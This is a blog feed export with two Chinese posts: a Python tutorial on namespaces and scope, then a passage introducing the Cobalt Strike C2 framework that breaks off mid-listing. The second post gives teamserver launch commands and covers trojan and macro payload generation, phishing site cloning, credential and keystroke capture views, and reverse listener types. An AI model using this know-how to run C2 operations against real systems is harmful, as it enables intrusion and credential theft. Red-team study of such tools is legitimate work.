        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140256593.png" alt="在这里插入图片描述"><br>本篇文章记录的是Python名称空间和作用域的知识。</p><h1 id="一、名称空间"><a href="#一、名称空间" class="headerlink" title="一、名称空间"></a>一、名称空间</h1><p>名称空间，名称即名字，空间就是存放东西的地方，那么名称空间你可以理解为就是放名字的地方，变量名是放在栈区的，变量值是放在堆区的，实际上名称空间是对栈区的划分，有了名称空间我们就可以在栈区中存放相同的名字了，名称空间让他们相互隔离开来，进而也实现了资源隔离，名称空间是一种虚拟化的划分，栈区是真实存在的。<br>&#x3D;&#x3D;我们讲名称空间只考虑名字 , 是不考虑值的 , 因为名字太重要了 , 通过名字可以引用到值&#x3D;&#x3D;</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4127b0f02c8af46e4b1682d3b50eb73f.png" alt="image-20201123202914416"></p><h1 id="二、三种名称空间"><a href="#二、三种名称空间" class="headerlink" title="二、三种名称空间"></a>二、三种名称空间</h1><h2 id="1、-内置名称空间"><a href="#1、-内置名称空间" class="headerlink" title="1、 内置名称空间"></a>1、 内置名称空间</h2><blockquote><p>存放python解释器内置的名字 , 比如 print input等</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">print</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">input</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">input</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>存活周期 ：</strong></p><p>python解释器启动则产生，python解释器关闭则销毁</p><h2 id="2、-全局名称空间"><a href="#2、-全局名称空间" class="headerlink" title="2、 全局名称空间"></a>2、 全局名称空间</h2><blockquote><p>只要不是函数内定义、也不是内置的，剩下的都是全局名称空间的名字</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  <span class="comment"># os是存放在全局名称空间的名字</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">123</span>     <span class="comment"># x是存放在全局名称空间的名字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func        <span class="comment"># func是存放在全局名称空间的名字</span></span><br></pre></td></tr></table></figure><p><strong>存活周期 ：</strong></p><p>python文件执行则产生，python文件运行完毕后销毁</p><h2 id="3、-局部名称空间"><a href="#3、-局部名称空间" class="headerlink" title="3、 局部名称空间"></a>3、 局部名称空间</h2><blockquote><p>在调用函数时，运行函数体代码过程中产生的函数内的名字(变量名)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    </span><br><span class="line">func()      <span class="comment"># 函数调用就会产生x,y这两个名字,放在局部名称空间 函数结束,名字就会被销毁</span></span><br></pre></td></tr></table></figure><p><strong>存活周期 :</strong> </p><p>在调用函数时存活，函数调用完毕后则销毁</p><p>&#x3D;&#x3D;友情提示 :&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 函数的每次调用都会产生一个局部名称空间,哪怕是一个空函数,</span></span><br><span class="line"><span class="comment"># 或者一直调用同一个函数,也会每次都会产生不同的局部名称空间</span></span><br></pre></td></tr></table></figure><h1 id="三、-三种顺序"><a href="#三、-三种顺序" class="headerlink" title="三、 三种顺序"></a>三、 三种顺序</h1><h2 id="1、-名称空间加载顺序"><a href="#1、-名称空间加载顺序" class="headerlink" title="1、 名称空间加载顺序"></a>1、 名称空间加载顺序</h2><p>名称空间的加载顺序你也可以认为是名称空间的生成顺序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内置名称空间&gt;全局名称空间&gt;局部名称空间</span></span><br></pre></td></tr></table></figure><h2 id="2、-名称空间销毁顺序"><a href="#2、-名称空间销毁顺序" class="headerlink" title="2、 名称空间销毁顺序"></a>2、 名称空间销毁顺序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 局部名称空间&gt;全局名空间&gt;内置名称空间</span></span><br></pre></td></tr></table></figure><h2 id="3、-名字查找顺序"><a href="#3、-名字查找顺序" class="headerlink" title="3、 名字查找顺序"></a>3、 名字查找顺序</h2><p>&#x3D;&#x3D;名字的查找顺序是以定义阶段为准的,从当前位置往外一层一层的找&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前所在的位置向上一层一层查找</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 内置名称空间  3层</span></span><br><span class="line"><span class="comment"># 全局名称空间  2层</span></span><br><span class="line"><span class="comment"># 局部名称空间  1层</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的层是我个人抽象出来的</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1d6bf2a63dd75a9c010b8656673ef7ac.png" alt="image-20201125151731595"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果当前在局部名称空间:</span></span><br><span class="line"><span class="comment"># 局部名称空间-&gt;全局名称空间-&gt;内置名称空间</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果当前在全局名称空间</span></span><br><span class="line"><span class="comment"># 全局名称空间-&gt;内置名称空间</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 举个栗子</span></span><br><span class="line">x = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(x)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    x = <span class="number">222</span></span><br><span class="line">    func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foo()       <span class="comment"># 打印1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 名称空间的&quot;嵌套&quot;关系是以函数定义阶段为准，与调用位置无关</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    x = <span class="number">222</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(x)  </span><br><span class="line">    func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foo()    <span class="comment"># 打印222</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>虽然函数的定义不会执行代码，但是会在函数内部搞一个名字，会先存个名字，等到调用的时候在会具体赋值</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span> = <span class="number">111</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f2</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line">    <span class="built_in">input</span> = <span class="number">222</span></span><br><span class="line">    f2()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = <span class="number">333</span></span><br><span class="line">f1()        <span class="comment"># 运行打印222</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/eb316315f82f7ac0102b0ec902671621.png" alt="image-20201125161835781"></p><h1 id="四、-作用域"><a href="#四、-作用域" class="headerlink" title="四、 作用域"></a>四、 作用域</h1><p>域是指范围的意思，作用域就是作用范围的意思</p><p>按照名字作用范围的不同可以将三个名称空间划分为两个区域： 全局作用域与局部作用域</p><h2 id="1、-全局作用域"><a href="#1、-全局作用域" class="headerlink" title="1、 全局作用域"></a>1、 全局作用域</h2><p>全局作用域 : 位于全局名称空间、内置名称空间中的名字属于全局范围，该范围内的名字全局存活（除非被删除，</p><p>否则在整个文件执行过程中存活）、全局有效（在任意位置都可以使用）；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 特点: 全局存活</span></span><br><span class="line"><span class="comment">#      全局有效  被所有函数共享</span></span><br></pre></td></tr></table></figure><h2 id="2、-局部作用域"><a href="#2、-局部作用域" class="headerlink" title="2、 局部作用域"></a>2、 局部作用域</h2><p>局部作用域:位于局部名称空间中的名字属于局部范围。该范围内的名字临时存活（即在函数调用时临时生成，函</p><p>数调用结束后就释放）、局部有效（只能在函数内使用）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 特点: 临时存活</span></span><br><span class="line"><span class="comment">#      局部有效 : 函数内有效</span></span><br></pre></td></tr></table></figure><h2 id="3、-locals和globals"><a href="#3、-locals和globals" class="headerlink" title="3、 locals和globals"></a>3、 locals和globals</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># locals() 函数返回局部作用域中所有的名字</span></span><br><span class="line"><span class="comment"># globals() 函数返回全局作用域中所有的名字</span></span><br><span class="line"><span class="comment"># 返回的内容格式是字典格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">func() <span class="comment"># &#123;&#x27;x&#x27;: 1&#125;</span></span><br></pre></td></tr></table></figure><h1 id="五、global和nonlocal"><a href="#五、global和nonlocal" class="headerlink" title="五、global和nonlocal"></a>五、global和nonlocal</h1><h2 id="1、-global-了解"><a href="#1、-global-了解" class="headerlink" title="1、 global(了解)"></a>1、 global(了解)</h2><p>在函数内，无论嵌套多少层，都可以查看到全局作用域的名字，若要在函数内修改全局名称空间中名字的值，当值</p><p>为<code>不可变类型</code>时，则需要用到<code>global关键字</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;ymn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">global</span> name  <span class="comment"># 把全局中的名字加载到局部内</span></span><br><span class="line">    name = <span class="string">&#x27;dl&#x27;</span>  <span class="comment"># 修改对应的值，这个值不会因为函数的结束，就销毁了，因为它作用到全局</span></span><br><span class="line">    <span class="built_in">print</span>(name)  <span class="comment"># 打印 dl</span></span><br><span class="line">    </span><br><span class="line">func()        </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)     <span class="comment"># name的值已经被修改了,所以打印 dl</span></span><br></pre></td></tr></table></figure><h2 id="2、-nonlocal-了解"><a href="#2、-nonlocal-了解" class="headerlink" title="2、 nonlocal(了解)"></a>2、 nonlocal(了解)</h2><p>nonlocal 会从当前函数的外层函数开始一层层去查找名字，若是一直到最外层函数都找不到，则会抛出异常。</p><p>nonlocal的查询边界就是最外面的一层函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> x</span><br><span class="line">        x = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    func2()  <span class="comment"># 调用fcun(),修改func作用域中名字x的值</span></span><br><span class="line">    <span class="built_in">print</span>(x)  <span class="comment"># 在func作用域查看x</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func()  <span class="comment"># 结果2</span></span><br><span class="line"><span class="built_in">print</span>(x)  <span class="comment"># 打印0  打印的是全局作用域中x的值</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike体验</title>
      <link href="/2022/06/18/cs_tool_use/"/>
      <url>/2022/06/18/cs_tool_use/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/01/9dfdd83af53840cbb6c426bcf2b8f16c.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章仅用于学习记录，不得用于其他用途。&#x3D;&#x3D;</p><h1 id="一、CS简介"><a href="#一、CS简介" class="headerlink" title="一、CS简介"></a>一、CS简介</h1><h2 id="1、CS简介"><a href="#1、CS简介" class="headerlink" title="1、CS简介"></a>1、CS简介</h2><p>Cobalt Strike是一款基于java的渗透测试神奇，常被称为CS神奇。自3.0以后已经不在使用Metasploit框 架而作为一个独立的平台使用，分为客户端与服务端 (CS架构的)，服务端是一个，客户端可以有多个，非常适合团 队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做 模拟对抗，进行内网渗透。<br>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木⻢生成，win dll木⻢生成， java木⻢生成，office宏病毒生成，木⻢捆绑;钓⻥攻击包括:站点克隆，目标信息获取，java执行，浏览器自动攻击等等。<br><strong>官方网站</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cobaltstrike.com/</span><br></pre></td></tr></table></figure><h2 id="2、为什么有CS"><a href="#2、为什么有CS" class="headerlink" title="2、为什么有CS"></a>2、为什么有CS</h2><p>非常适合团队协同作战 , 简称多人运动 , 插件也比较丰富 , 也是目前主流的c2工具<br>#二、目录结构<br><img src="http://120.48.107.243:9090/blog/2023/04/01/747bafbae6b7493ca8dafb6e791d6592.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">agscript拓展应用的脚本</span><br><span class="line">c2lint用于检查profile文件的错误异常</span><br><span class="line">teamserver服务端程序</span><br><span class="line">cobaltstrike，cobaltstrike.jar 客户端程序(java跨平台)</span><br><span class="line">license.pdf许可证文件</span><br><span class="line">logs 目录记录与目标主机的相关信息</span><br><span class="line">update，update.jar 用于更新CS</span><br><span class="line">third<span class="literal">-party</span>第三方工具    </span><br></pre></td></tr></table></figure><h1 id="三、安装和运行"><a href="#三、安装和运行" class="headerlink" title="三、安装和运行"></a>三、安装和运行</h1><h2 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h2><p>团队服务器最好运行在Linux平台上，服务端的关键文件是teamserver和cobaltstrike.jar，将这两个文件放在同一目录下运行，teamserver要有可以运行的权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver</span><br><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/<span class="type">path</span>/<span class="type">to</span>/<span class="type">c2.profile</span>] [<span class="type">YYYY</span>-<span class="type">MM</span>-<span class="type">DD</span>] &lt;host&gt; 必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt; 必需参数 连接服务器的密码</span><br><span class="line">[/<span class="type">path</span>/<span class="type">to</span>/<span class="type">c2.profile</span>] 可选参数 指定C2通信配置文件，体现其强大的扩展性 [<span class="type">YYYY</span>-<span class="type">MM</span>-<span class="type">DD</span>] 可选参数 所有payload的终止时间</span><br><span class="line"><span class="comment"># 一般启动Team Server</span></span><br><span class="line">./teamserver <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">123456</span> <span class="comment"># 设置强密码，否则容易被爆破，参考附录</span></span><br></pre></td></tr></table></figure><h2 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h2><p>Linux：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike 或 java <span class="literal">-XX</span>:+AggressiveHeap <span class="literal">-XX</span>:+UseParallelGC <span class="literal">-jar</span> cobaltstrike.jar</span><br></pre></td></tr></table></figure><p>Windows：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">双击cobaltstrike.exe , `但是一般都有对应平台的启动脚本` </span><br></pre></td></tr></table></figure><h1 id="四、菜单栏详情"><a href="#四、菜单栏详情" class="headerlink" title="四、菜单栏详情"></a>四、菜单栏详情</h1><h2 id="1、Cobalt-Strike"><a href="#1、Cobalt-Strike" class="headerlink" title="1、Cobalt Strike"></a>1、Cobalt Strike</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New Connection Preferences Visualization VPN Interfaces Listenrs Script Manager 令行，提权脚本等</span><br><span class="line"><span class="comment"># 新建连接，支持连接多个服务器端</span></span><br><span class="line"><span class="comment"># 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</span></span><br><span class="line"><span class="comment"># 主要展示输出结果的视图 # 设置VPN接口</span></span><br><span class="line"><span class="comment"># 创建监听器</span></span><br><span class="line"><span class="comment"># 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span></span><br></pre></td></tr></table></figure><h2 id="2、View"><a href="#2、View" class="headerlink" title="2、View"></a>2、View</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications<span class="comment"># 显示受害主机的应用信息</span></span><br><span class="line">Credentials<span class="comment"># 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz # 查看已下载文件</span></span><br><span class="line">Downloads<span class="comment">#查看已下载文件</span></span><br><span class="line">Event Log<span class="comment"># 主机上线记录以及团队协作聊天记录 </span></span><br><span class="line">Keystrokes<span class="comment"># 查看键盘记录结果</span></span><br><span class="line">Proxy Pivots<span class="comment"># 查看代理模块</span></span><br><span class="line">Screenshots<span class="comment"># 查看所有屏幕截图</span></span><br><span class="line">Script Console<span class="comment"># 加载第三方脚本以增强功能</span></span><br><span class="line">Targets<span class="comment"># 显示所有受害主机</span></span><br><span class="line">Web Log<span class="comment"># 所有Web服务的日志</span></span><br></pre></td></tr></table></figure><h2 id="3、Attacks"><a href="#3、Attacks" class="headerlink" title="3、Attacks"></a>3、Attacks</h2><h3 id="（1）Package"><a href="#（1）Package" class="headerlink" title="（1）Package"></a>（1）Package</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTML Application</span><br><span class="line">MS Office Macro</span><br><span class="line">Payload Generator</span><br><span class="line">Windows Executable</span><br><span class="line">Windows Executable(Stageless) <span class="comment"># 生成无状态的可执行exe木⻢</span></span><br></pre></td></tr></table></figure><h3 id="（2）Web-DriveManage"><a href="#（2）Web-DriveManage" class="headerlink" title="（2）Web DriveManage"></a>（2）Web DriveManage</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manage<span class="comment">#对开启的web服务进行管理</span></span><br><span class="line">Clone Site<span class="comment">#克隆网站，可以记录受害者提交的数据</span></span><br><span class="line">Host File<span class="comment">#提供文件下载，可以选择Mime类型</span></span><br><span class="line">Scripted Web Delivery<span class="comment">#为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery</span></span><br><span class="line">Signed Applet Attack<span class="comment">#使用java自签名的程序进行钓⻥攻击(该方法已过时)</span></span><br><span class="line">Smart Applet Attack<span class="comment">#自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下</span></span><br><span class="line">版本(该方法已过时)</span><br><span class="line">System Profiler <span class="comment">#用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4、Reporting"><a href="#4、Reporting" class="headerlink" title="4、Reporting"></a>4、Reporting</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Activity Report <span class="comment"># 活动报告</span></span><br><span class="line">Hosts Report <span class="comment"># 主机报告</span></span><br><span class="line">Indicators of Compromise <span class="comment"># IOC报告:包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes Sessions Report # 会话报告</span></span><br><span class="line">Social Engineering Report <span class="comment"># 社会工程报告:包括⻥叉钓⻥邮件及点击记录</span></span><br><span class="line">Tactics, Techniques, and Procedures <span class="comment"># 战术技术及相关程序报告:包括行动对应的每种战术的检测策略 和缓解策略</span></span><br><span class="line">Reset <span class="keyword">Data</span> <span class="comment"># 重置数据</span></span><br><span class="line">Export <span class="keyword">Data</span> <span class="comment"># 导出数据，导出.tsv文件格式</span></span><br></pre></td></tr></table></figure><h2 id="5、Help"><a href="#5、Help" class="headerlink" title="5、Help"></a>5、Help</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Homepage <span class="comment"># 官方主⻚</span></span><br><span class="line">Support <span class="comment"># 技术支持</span></span><br><span class="line">Arsenal <span class="comment"># 开发者</span></span><br><span class="line">System information <span class="comment"># 版本信息 About # 关于</span></span><br></pre></td></tr></table></figure><h1 id="五、工具栏"><a href="#五、工具栏" class="headerlink" title="五、工具栏"></a>五、工具栏</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/01/e30efb1d697147e79d2729750d567725.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.新建连接</span><br><span class="line"><span class="number">2</span>.断开当前连接</span><br><span class="line"><span class="number">3</span>.监听器</span><br><span class="line"><span class="number">4</span>.改变视图为Pivot Graph(视图列表) </span><br><span class="line"><span class="number">5</span>.改变视图为Session Table(会话列表)</span><br><span class="line"><span class="number">6</span>.改变视图为Target Table(目标列表)  </span><br><span class="line"><span class="number">7</span>.显示所有以获取的受害主机的凭证</span><br><span class="line"><span class="number">8</span>.查看已下载文件</span><br><span class="line"><span class="number">9</span>.查看键盘记录结果</span><br><span class="line"><span class="number">10</span>.查看屏幕截图 </span><br><span class="line"><span class="number">11</span>.生成无状态的可执行exe木⻢ </span><br><span class="line"><span class="number">12</span>.使用java自签名的程序进行钓⻥攻击 </span><br><span class="line"><span class="number">13</span>.生成office宏病毒文件 </span><br><span class="line"><span class="number">14</span>.为payload提供web服务以便下载和执行 </span><br><span class="line"><span class="number">15</span>.提供文件下载，可以选择Mime类型 </span><br><span class="line"><span class="number">16</span>.管理Cobalt Strike上运行的web服务 </span><br><span class="line"><span class="number">17</span>.帮助</span><br><span class="line"><span class="number">18</span>.关于</span><br></pre></td></tr></table></figure><h1 id="六、基本流程"><a href="#六、基本流程" class="headerlink" title="六、基本流程"></a>六、基本流程</h1><h2 id="1、创建监听器"><a href="#1、创建监听器" class="headerlink" title="1、创建监听器"></a>1、创建监听器</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">什么是监听器</span><br><span class="line">顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</span><br><span class="line">监听器的作用</span><br><span class="line">主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。 比如payload在目标机器执行以后，就会回连到监听器 , 然后下载执行真正的shellcode代码。</span><br><span class="line">一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深</span><br><span class="line">入了解如何准确配置监听器。</span><br><span class="line">一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 监听器的名字一般由以下结构组成</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Operating System/Payload/Stager</span><br><span class="line">如 : windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了九个Listener</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_dns/reverse_dns_txt</span><br><span class="line">windows/beacon_dns/reverse_http</span><br><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br><span class="line">windows/beacon_smb/bind_pipe</span><br><span class="line">windows/foreign/reverse_dns_txt</span><br><span class="line">windows/foreign/reverse_http</span><br><span class="line">windows/foreign/reverse_https</span><br><span 